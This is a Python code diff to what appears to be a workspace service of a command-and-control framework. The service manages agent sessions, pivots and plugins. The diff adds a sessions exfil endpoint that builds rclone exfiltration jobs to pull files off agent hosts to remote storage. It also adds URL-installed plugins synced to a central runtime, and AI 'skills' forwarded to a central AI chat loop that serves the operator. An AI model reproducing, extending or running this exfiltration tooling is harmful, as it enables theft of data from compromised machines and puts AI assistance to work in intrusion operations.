@@ -28,6 +28,16 @@ import urllib.request
 from datetime import datetime
 from typing import Any
 
+from rmm_rclone import (
+    RcloneConfigError,
+    build_exfil_payload,
+    build_plugin_exfil_job,
+    get_rclone_default_profile,
+    load_profiles,
+    rclone_public_config,
+)
+from rmm_ai_skills import _load_all_skills_full, list_ai_skills
+from rmm_asset_store import AssetError, AssetStore
 from workspace_pivot import WorkspacePivotManager
 
 
@@ -86,6 +96,7 @@ class WorkspaceStore:
                 os.chmod(path, 0o700)
             except OSError:
                 pass
+        self.assets = AssetStore(self.data_dir / "assets")
         self._lock = threading.RLock()
         self._db = sqlite3.connect(self.data_dir / "workspace.db", check_same_thread=False)
         self._db.row_factory = sqlite3.Row
@@ -96,6 +107,74 @@ class WorkspaceStore:
             os.chmod(self.data_dir / "workspace.db", 0o600)
         except OSError:
             pass
+
+    @property
+    def asset_store(self) -> AssetStore:
+        """Return the persistent workspace asset store."""
+        return self.assets
+
+    def asset_list(self, kind: str | None = None) -> list[dict[str, Any]]:
+        """List operator-managed assets stored in this workspace."""
+        return self.assets.list(kind)
+
+    def rclone_profiles(self) -> dict[str, dict]:
+        """Load enabled workspace rclone profile files, falling back to legacy config."""
+        profiles: dict[str, dict] = {}
+        for row in self.assets.list("rclone", include_disabled=False):
+            try:
+                payload = json.loads(self.assets.read("rclone", row["name"]))
+            except (AssetError, json.JSONDecodeError):
+                continue
+            if not isinstance(payload, dict):
+                continue
+            if payload.get("type"):
+                name = str(payload.get("name") or Path(row["name"]).stem).strip()
+                if name:
+                    profiles[name] = payload
+                continue
+            for name, profile in payload.items():
+                if isinstance(profile, dict) and profile.get("type"):
+                    profiles[str(name)] = profile
+        if profiles:
+            return profiles
+        return load_profiles()
+
+    def skill_directories(self) -> list[str]:
+        """Return built-in skills followed by the workspace skill overlay."""
+        builtin = str(ROOT / "ai-skills")
+        return [builtin, str(self.assets.root / "skills")]
+
+    def skill_overrides(self) -> dict[str, bool]:
+        """Return explicit workspace skill enablement flags."""
+        flags = self.assets.flags("skills")
+        for name, enabled in list(flags.items()):
+            if name.lower().endswith(".md"):
+                flags.setdefault(Path(name).stem.lower(), enabled)
+        return flags
+
+    def list_skills(self) -> list[dict]:
+        """Return built-in and uploaded skill metadata with workspace state."""
+        return list_ai_skills(self.skill_directories(), self.skill_overrides())
+
+    def selected_skill_documents(self, skill_ids: list[str] | None) -> list[dict]:
+        """Return selected local skill documents for forwarding to the central AI loop."""
+        available = {
+            row["id"]: row
+            for row in _load_all_skills_full(self.skill_directories())
+            if self.skill_overrides().get(row["id"], True)
+        }
+        if skill_ids is None:
+            selected = [
+                row for row in available.values()
+                if row.get("default") or row.get("always")
+            ]
+        else:
+            selected = []
+            ids = {str(value or "").strip().lower() for value in skill_ids}
+            for row in available.values():
+                if row["id"] in ids or row.get("always"):
+                    selected.append(row)
+        return selected
 
     def _init_schema(self) -> None:
         """Create the local workspace schema on first start."""
@@ -665,6 +744,32 @@ class WorkspaceService:
         responses = payload.get("responses")
         return responses if isinstance(responses, list) else []
 
+    def _sync_plugin_asset(self, row: dict[str, Any] | None, *, removed: bool = False) -> bool:
+        """Publish one workspace plugin artifact to the central runtime cache."""
+        if not isinstance(row, dict) or not row.get("name"):
+            return False
+        payload: dict[str, Any] = {
+            "name": row["name"],
+            "enabled": bool(row.get("enabled", True)) and not removed,
+            "sha256": row.get("sha256"),
+        }
+        if not removed:
+            try:
+                payload["content_b64"] = base64.b64encode(
+                    self.store.asset_store.read("plugins", row["name"], enabled_only=False)
+                ).decode("ascii")
+            except AssetError:
+                return False
+        status, _response, _content_type = self.upstream.request(
+            "POST", "/api/v1/workspace/assets/plugins", payload
+        )
+        return status == 200
+
+    def _sync_workspace_plugins(self) -> None:
+        """Republish persistent workspace plugins after a central restart."""
+        for row in self.store.asset_list("plugins"):
+            self._sync_plugin_asset(row)
+
     def _resolve_local_session_id(self, ref: str) -> str | None:
         """Resolve an API session reference using workspace-local state."""
         session = self.store.resolve_session(ref, active_only=True)
@@ -759,6 +864,10 @@ class WorkspaceService:
         handler = type("BoundWorkspaceHandler", (WorkspaceRequestHandler,), {"service": self})
         self.http_server = ThreadingHTTPServer((self.bind, self.port), handler)
         self.port = int(self.http_server.server_address[1])
+        try:
+            self._sync_workspace_plugins()
+        except Exception as exc:
+            self.log(f"Workspace plugin sync failed: {exc}", "WARNING")
         self._sync_thread.start()
         self.log(f"Workspace {self.workspace_id} listening on {self.bind}:{self.port}", "SUCCESS")
         return self.http_server
@@ -796,6 +905,75 @@ class WorkspaceService:
     def _proxy(self, method: str, path: str, body: dict[str, Any] | None = None, timeout: float = 30):
         """Forward a non-local API call to the central broker."""
         return self.upstream.request(method, path, body, timeout=timeout)
+
+    def _rclone_config(self) -> dict[str, Any]:
+        """Return local profiles combined with central execution capabilities."""
+        profiles = self.store.rclone_profiles() if hasattr(self, "store") else load_profiles()
+        config = rclone_public_config(
+            profiles=profiles,
+            default_profile=get_rclone_default_profile(),
+        )
+        status, payload, _content_type = self._proxy("GET", "/api/v1/rclone/capabilities")
+        if status == 200 and isinstance(payload, dict):
+            config["rclone_binary"] = bool(payload.get("rclone_binary"))
+            config["rclone_binary_path"] = None
+            config["rclone_plugin"] = payload.get("rclone_plugin")
+        else:
+            config["rclone_binary"] = False
+            config["rclone_binary_path"] = None
+            config["rclone_plugin"] = None
+        config["workspace_local"] = True
+        config["profiles_scope"] = "workspace"
+        return config
+
+    def _workspace_exfil_job(
+        self,
+        session: dict[str, Any],
+        remote_path: str,
+        profile_name: str,
+        dest: str | None,
+        mode: str,
+    ) -> tuple[dict[str, Any], dict[str, Any]]:
+        """Build one workspace-owned rclone job and its public status."""
+        mode = (mode or "auto").strip().lower()
+        if mode not in {"auto", "plugin", "binary"}:
+            raise ValueError("exfil mode must be auto, plugin, or binary")
+        profiles = self.store.rclone_profiles() if hasattr(self, "store") else load_profiles()
+        config = self._rclone_config()
+        plugin_ready = bool(
+            config.get("rclone_plugin")
+            and str(session.get("agent_type") or "").lower() == "go"
+            and "pe" in (session.get("capabilities") or [])
+        )
+        if mode in {"auto", "plugin"} and plugin_ready:
+            job = {
+                "plugin_job": build_plugin_exfil_job(
+                    remote_path,
+                    profile_name,
+                    dest=dest,
+                    profiles=profiles,
+                    max_bytes=config.get("max_bytes"),
+                ),
+                "max_bytes": config.get("max_bytes"),
+            }
+            return job, config
+        if mode == "plugin":
+            raise ValueError("rclone plugin unavailable for this agent or workspace")
+        if not config.get("rclone_binary"):
+            raise RcloneConfigError(
+                "rclone binary bootstrap is unavailable on the central control plane"
+            )
+        job = {
+            "binary_payload": build_exfil_payload(
+                remote_path,
+                profile_name,
+                dest=dest,
+                profiles=profiles,
+                max_bytes=config.get("max_bytes"),
+            ),
+            "max_bytes": config.get("max_bytes"),
+        }
+        return job, config
 
     def _local_session(self, ref: str) -> dict[str, Any] | None:
         """Resolve a local session row for API and pivot handlers."""
@@ -844,6 +1022,26 @@ class WorkspaceService:
         if parts == ["tun"]:
             rows = self.pivots.list_tun_status()
             return 200, {"count": len(rows), "relays": rows}, "application/json"
+        if parts == ["rclone", "config"]:
+            return 200, self._rclone_config(), "application/json"
+        if parts == ["assets"]:
+            rows = self.store.asset_list()
+            return 200, {"assets": rows, "count": len(rows), "workspace_local": True}, "application/json"
+        if len(parts) == 2 and parts[0] == "assets":
+            try:
+                kind = parts[1]
+                rows = self.store.asset_list(kind)
+            except AssetError as exc:
+                return 400, {"error": str(exc)}, "application/json"
+            return 200, {"assets": rows, "count": len(rows), "workspace_local": True}, "application/json"
+        if parts == ["plugins"]:
+            # The central broker owns the runtime plugin inventory, including
+            # artifacts seeded in its persistent volume and workspace copies.
+            # The workspace service still owns URL-installed source metadata.
+            return self._proxy("GET", path)
+        if parts == ["ai", "skills"]:
+            skills = self.store.list_skills()
+            return 200, {"skills": skills, "count": len(skills), "workspace_local": True}, "application/json"
         if len(parts) == 4 and parts[0] == "sessions" and parts[2:4] == ["ai", "chat"]:
             sid, messages = self.store.get_ai_chat(parts[1])
             return (200, {"session_id": sid, "messages": messages or [], "count": len(messages or [])}, "application/json") if sid else (404, {"error": "session_not_found"}, "application/json")
@@ -861,6 +1059,31 @@ class WorkspaceService:
     def post_json(self, path: str, body: dict[str, Any]) -> tuple[int, Any, str] | None:
         """Handle local pivot and AI persistence endpoints or return ``None``."""
         parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
+        asset_kind = None
+        if len(parts) == 2 and parts[0] == "assets":
+            asset_kind = parts[1]
+        elif parts == ["plugins"]:
+            asset_kind = "plugins"
+        elif parts == ["ai", "skills"]:
+            asset_kind = "skills"
+        elif parts == ["rclone", "profiles"]:
+            asset_kind = "rclone"
+        if asset_kind:
+            url = str(body.get("url") or "").strip()
+            if not url:
+                return 400, {"error": "missing_url"}, "application/json"
+            try:
+                row = self.store.asset_store.add_url(
+                    asset_kind,
+                    url,
+                    name=str(body.get("name") or "").strip(),
+                    enabled=bool(body.get("enabled", True)),
+                )
+            except AssetError as exc:
+                return 400, {"error": str(exc)}, "application/json"
+            if asset_kind == "plugins" and not self._sync_plugin_asset(row):
+                return 502, {"error": "central_plugin_cache_sync_failed", "asset": row}, "application/json"
+            return 201, {"ok": True, "asset": row, "workspace_local": True}, "application/json"
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "socks":
             session = self._local_session(parts[1])
             if not session:
@@ -901,8 +1124,50 @@ class WorkspaceService:
             response = dict(payload) if isinstance(payload, dict) else {}
             response.update({"tun": local, "workspace_local": True})
             return 200, response, "application/json"
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "exfil":
+            session = self._local_session(parts[1])
+            if not session:
+                return 404, {"error": "session_not_found"}, "application/json"
+            remote_path = str(body.get("remote_path") or "").strip()
+            if not remote_path:
+                return 400, {"error": "missing_remote_path"}, "application/json"
+            profile_name = str(body.get("profile") or get_rclone_default_profile()).strip()
+            dest = str(body.get("dest") or "").strip() or None
+            mode = str(body.get("mode") or "auto").strip().lower()
+            try:
+                workspace_job, config = self._workspace_exfil_job(
+                    session, remote_path, profile_name, dest, mode
+                )
+            except (ValueError, RcloneConfigError) as exc:
+                return 503, {"error": str(exc), "rclone": self._rclone_config()}, "application/json"
+            upstream_body = {
+                "remote_path": remote_path,
+                "profile": profile_name,
+                "dest": dest,
+                "mode": mode,
+                "workspace_job": workspace_job,
+            }
+            status, payload, content_type = self._proxy("POST", path, upstream_body)
+            if status != 200:
+                return status, payload, content_type
+            response = dict(payload) if isinstance(payload, dict) else {}
+            response.update(
+                {
+                    "profile": profile_name,
+                    "mode": mode,
+                    "max_bytes": config.get("max_bytes"),
+                    "rclone": config,
+                    "workspace_local": True,
+                }
+            )
+            return 200, response, "application/json"
         if parts == ["ai", "chat"]:
-            status, payload, content_type = self._proxy("POST", path, body, timeout=300)
+            forwarded = dict(body)
+            skill_ids = forwarded.get("skill_ids")
+            if skill_ids is not None and not isinstance(skill_ids, list):
+                return 400, {"error": "invalid_skill_ids"}, "application/json"
+            forwarded["skill_documents"] = self.store.selected_skill_documents(skill_ids)
+            status, payload, content_type = self._proxy("POST", path, forwarded, timeout=300)
             if status == 200 and isinstance(payload, dict) and payload.get("ok") and body.get("selected_session_id"):
                 messages = list(body.get("messages") or [])
                 reply = payload.get("message")
@@ -911,6 +1176,27 @@ class WorkspaceService:
                 self.store.save_ai_chat(str(body["selected_session_id"]), messages)
             return status, payload, content_type
         return None
+
+    def patch_json(self, path: str, body: dict[str, Any]) -> tuple[int, Any, str] | None:
+        """Handle local asset enablement updates or return ``None`` for proxying."""
+        parts = [part for part in path[len("/api/v1/"):].split("/") if part] if path.startswith("/api/v1/") else []
+        if len(parts) == 3 and parts[0] == "assets":
+            kind, name = parts[1], urllib.parse.unquote(parts[2])
+        elif len(parts) == 2 and parts[0] in {"plugins", "rclone", "skills"}:
+            kind, name = parts[0], urllib.parse.unquote(parts[1])
+        else:
+            return None
+        try:
+            enabled = bool(body.get("enabled"))
+            if kind in {"skills", "skill"} and not Path(name).suffix:
+                row = self.store.asset_store.set_flag("skills", name, enabled)
+            else:
+                row = self.store.asset_store.set_enabled(kind, name, enabled)
+        except AssetError as exc:
+            return 404, {"error": str(exc)}, "application/json"
+        if kind in {"plugins", "plugin"} and not self._sync_plugin_asset(row):
+            return 502, {"error": "central_plugin_cache_sync_failed"}, "application/json"
+        return 200, {"ok": True, "asset": row, "workspace_local": True}, "application/json"
 
     def delete_json(self, path: str) -> tuple[int, Any, str] | None:
         """Handle local history and AI deletion endpoints or return ``None``."""
@@ -927,6 +1213,22 @@ class WorkspaceService:
             if not self.store.clear_ai_chat(parts[1]):
                 return 404, {"error": "session_not_found"}, "application/json"
             return 200, {"ok": True, "session_id": parts[1]}, "application/json"
+        if len(parts) == 3 and parts[0] == "assets":
+            kind, name = parts[1], urllib.parse.unquote(parts[2])
+        elif len(parts) == 2 and parts[0] in {"plugins", "rclone", "skills"}:
+            kind, name = parts[0], urllib.parse.unquote(parts[1])
+        else:
+            kind = name = None
+        if kind and name:
+            try:
+                removed = self.store.asset_store.remove(kind, name)
+            except AssetError:
+                removed = False
+            if not removed:
+                return 404, {"error": "asset_not_found"}, "application/json"
+            if kind in {"plugins", "plugin"}:
+                self._sync_plugin_asset({"name": name}, removed=True)
+            return 200, {"ok": True, "kind": kind, "name": name}, "application/json"
         return None
 
 
@@ -1024,6 +1326,8 @@ class WorkspaceRequestHandler(BaseHTTPRequestHandler):
             result = self.service.get_json(path, qs)
         elif method == "POST":
             result = self.service.post_json(path, body or {})
+        elif method == "PATCH":
+            result = self.service.patch_json(path, body or {})
         elif method == "DELETE":
             result = self.service.delete_json(path)
         if result is None:
